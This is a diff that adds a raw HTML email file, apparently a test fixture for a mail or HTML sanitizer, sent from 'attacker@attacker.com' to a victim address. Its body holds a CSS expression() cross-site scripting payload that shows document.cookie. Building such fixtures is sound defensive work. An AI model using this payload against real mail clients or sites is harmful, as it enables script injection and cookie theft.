@@ -1,0 +1,7 @@
+From: <attacker@attacker.com>
+Subject: kuangkuang
+To: victim@wo.com
+MIME-Version: 1.0
+Content-type: text/html
+
+<div style="left:expression(alert(document.cookie))">
